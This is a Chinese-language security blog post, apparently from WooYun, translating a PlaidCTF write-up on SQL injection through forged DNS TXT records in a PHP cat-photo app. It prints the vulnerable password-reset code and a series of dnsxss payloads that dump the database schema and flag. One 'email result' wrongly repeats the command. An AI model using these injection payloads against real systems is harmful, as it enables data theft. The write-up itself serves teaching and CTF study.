@@ -1,0 +1,69 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">SQL Injection via DNS</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">BMa</a> <span class="bull">·</span> <time title="2015/01/15 12:35" ui-time="" datetime="2015/01/15 12:35" class="published ng-binding ng-isolate-scope">2015/01/15 12:35</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>原文：<a href="https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns">https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns</a></p><p>建议先看：<a href="http://drops.wooyun.org/papers/3133">http://drops.wooyun.org/papers/3133</a></p><h2>0x00 分析</h2><hr><p>Whatscat是一个可以上传猫咪的照片并且可以评论的php应用，地址：</p><p>https://blogdata.skullsecurity.org/whatscat.tar.bz2</p><p>漏洞代码存在于login.php的密码重置模块，如下：</p><pre><code>#!php
+elseif (isset($_POST["reset"])) {
+    $q = mysql_query(sprintf("select username,email,id from users where username='%s'",
+      mysql_real_escape_string($_POST["name"])));
+    $res = mysql_fetch_object($q);
+    $pwnew = "cat".bin2hex(openssl_random_pseudo_bytes(8));
+    if ($res) {
+      echo sprintf("&lt;p&gt;Don't worry %s, we're emailing you a new password at %s&lt;/p&gt;",
+        $res-&gt;username,$res-&gt;email);
+      echo sprintf("&lt;p&gt;If you are not %s, we'll tell them something fishy is going on!&lt;/p&gt;",
+        $res-&gt;username);
+$message = &lt;&lt;&lt;CAT
+Hello. Either you or someone pretending to be you attempted to reset your password.
+Anyway, we set your new password to $pwnew
+
+If it wasn't you who changed your password, we have logged their IP information as follows:
+CAT;
+      $details = gethostbyaddr($_SERVER['REMOTE_ADDR']).
+        print_r(dns_get_record(gethostbyaddr($_SERVER['REMOTE_ADDR'])),true);
+      mail($res-&gt;email,"whatscat password reset",$message.$details,"From: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4c3b242d383f2f2d380c3b242d383f2f2d38622f2d38">[email&#160;protected]</a>\r\n");
+      mysql_query(sprintf("update users set password='%s', resetinfo='%s' where username='%s'",
+              $pwnew,$details,$res-&gt;username));
+    }
+    else {
+      echo "Hmm we don't seem to have anyone signed up by that name";
+    }
+</code></pre><p>注意如下代码：</p><pre><code>#!php
+  $details = gethostbyaddr($_SERVER['REMOTE_ADDR']).
+    print_r(dns_get_record(gethostbyaddr($_SERVER['REMOTE_ADDR'])),true);
+  mail($res-&gt;email,"whatscat password reset",$message.$details,"From: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="05726d64717666647145726d6471766664712b666471">[email&#160;protected]</a>\r\n");
+  mysql_query(sprintf("update users set password='%s', resetinfo='%s' where username='%s'",
+          $pwnew,$details,$res-&gt;username));
+</code></pre><p>$details变量未编码即插入数据库中。我注意到过去人们过于相信DNS查询返回的结果，这是这种误区的最好事例！如果我们能够在DNS请求中插入SQL语句，就万事大吉了！</p><p>在完成Whatscat挑战过程中，我点击forgot password，输入用户名：admin，然后它发送给我的一个Mailinator，一个邮件服务器。我登录这个邮箱，注意到有些人尝试通过TXT记录进行SQL注入，这些可能是其他用户留下的记录。</p><p>这个TXT记录实际上是用于便捷地控制所有SkullSpace ip地址的PTR记录，它能够做一些有用的事情而不是用来破坏！我用这个服务器做blog和一些在SkullSpace网络上的东西，然后我通过它设置了test.skullseclabs.org的PTR记录。实际上，如果你对206.220.196.59进行DNS解析，你会看见如下内容：</p><pre><code>#!bash
+$ host blog.skullsecurity.org
+blog.skullsecurity.org is an alias for skullsecurity.org.
+skullsecurity.org has address 206.220.196.59
+$ host 206.220.196.59
+59.196.220.206.in-addr.arpa domain name pointer test.skullseclabs.org.
+</code></pre><p>我为test.skullseclabs.org控制了授权服务器，所以我可以伪造任意记录。虽然对于这个级别来说是杀鸡用牛刀，但是至少我不用每次为了改变一条记录而翻到注册页面，并且我可以使用我写的一个叫做dnsxss的工具快速做到： https://github.com/iagox86/nbtool</p><pre><code>#!bash
+$ sudo ./dnsxss --payload="Hello yes this is test"
+Listening for requests on 0.0.0.0:53
+Will response to queries with: Hello/yes/this/is/test
+
+$ dig -t txt test123.skullseclabs.org
+[...]
+;; ANSWER SECTION:
+test123.skullseclabs.org. 1     IN      TXT     "Hello yes this is test.test123.skullseclabs.org"
+</code></pre><p>现在要做的就是找到合适的payload！</p><h2>0x01 The exploit</h2><hr><p>我并不是盲注的fans，所以我在本地服务器搭了一个版本，打开SQL错误。然后我开始开发一个exploit！这是一条update语句，所以不能直接注入。我只能间接地通过将数据库内容返回在email上来读取。我也不知道如何适当地终止SQL语句(既不用#，也不用--，以及;)，最终我的payload将能够：</p><pre><code>UPDATE其他的值到email字段上
+恰当地读到最后，意味着用”resetinfo=”结束查询，所以”resetinfo=”字段会被余下部分填充。
+</code></pre><p>最终payload如下：</p><pre><code>./dnsxss --payload="test', email='test1234', resetinfo='"
+</code></pre><p>我创建了一个账户，从我的ip重置密码，刷新。在测试服务器上完整的语句如下：</p><pre><code>update users set password='catf7a252e008616c94', resetinfo='test.skullseclabs.orgArray ( [0] =&gt; Array ( [host] =&gt; test.skullseclabs.org [class] =&gt; IN [ttl] =&gt; 1 [type] =&gt; TXT [txt] =&gt; test', email='test1234', resetinfo='.test.skullseclabs.org [entries] =&gt; Array ( [0] =&gt; test', email='test1234', resetinfo=' ) ) ) ' where username='ron'
+</code></pre><p>运行之后，重置密码内容如下：</p><pre><code>Don't worry ron, we're emailing you a new password at test1234
+
+If you are not ron, we'll tell them something fishy is going on!
+</code></pre><p>已经成功重置了密码！</p><p>但是我想要的不是这个！</p><p>Mysql有一个非常便利的数据库叫做information_schema，可以通过它导出所有内容，修改payload如下：</p><pre><code>./dnsxss --payload="test', email=(select group_concat(SCHEMA_NAME separator ', ') from information_schema.SCHEMATA), resetinfo='"
+</code></pre><p>找回密码，刷新一下，收到如下邮件：</p><pre><code>Don't worry ron, we're emailing you a new password at information_schema, mysql, performance_schema, whatscat
+
+If you are not ron, we'll tell them something fishy is going on!
+</code></pre><p>得到whatscat的所有表名：</p><pre><code>./dnsxss --payload="test', email=(select group_concat(TABLE_NAME separator ', ') from information_schema.TABLES where TABLE_SCHEMA='whatscat'), resetinfo='"
+</code></pre><p>收到邮件：</p><pre><code>./dnsxss --payload="test', email=(select group_concat(TABLE_NAME separator ', ') from information_schema.TABLES where TABLE_SCHEMA='whatscat'), resetinfo='"
+</code></pre><p>得到flag表的所有列名：</p><pre><code>./dnsxss --payload="test', email=(select group_concat(COLUMN_NAME separator ', ') from information_schema.COLUMNS where TABLE_NAME='flag'), resetinfo='"
+</code></pre><p>收到邮件：</p><pre><code>Don't worry ron, we're emailing you a new password at flag
+
+If you are not ron, we'll tell them something fishy is going on!
+</code></pre><p>最后取出列中的内容：</p><pre><code>./dnsxss --payload="test', email=(select group_concat(flag separator ', ') from whatscat.flag), resetinfo='"
+</code></pre><p>得到flag：</p><pre><code>Don't worry ron, we're emailing you a new password at 20billion_d0llar_1d3a
+
+If you are not ron, we'll tell them something fishy is going on!
+</code></pre><h2>0x02 总结</h2><hr><p>这篇paper的重点是通过伪造了PTR的记录类型，将DNS查询的TXT记录定向到自己控制的dns服务器，从而控制了DNS插叙返回的内容，而人们往往是无条件信任DNS查询返回的内容。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">f4ckbaidu</span> <span class="reply-time">2015-01-19 11:03:46</span></div><p></p><p>前提是控制相关域的ns服务器～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2015-01-15 17:43:24</span></div><p></p><p>这不是去年pctf的web题么。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">路人甲</span> <span class="reply-time">2015-01-15 17:35:58</span></div><p></p><p>我也很认真的看了，但是没看懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ModNar</span> <span class="reply-time">2015-01-15 14:15:20</span></div><p></p><p>http://bernardodamele.blogspot.tw/2012/06/data-retrieval-over-dns-in-sql.html</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">路人甲</span> <span class="reply-time">2015-01-15 13:45:08</span></div><p></p><p>我很认真的看了，但是没看懂</p><p></p></div></div></div></div></div></main>
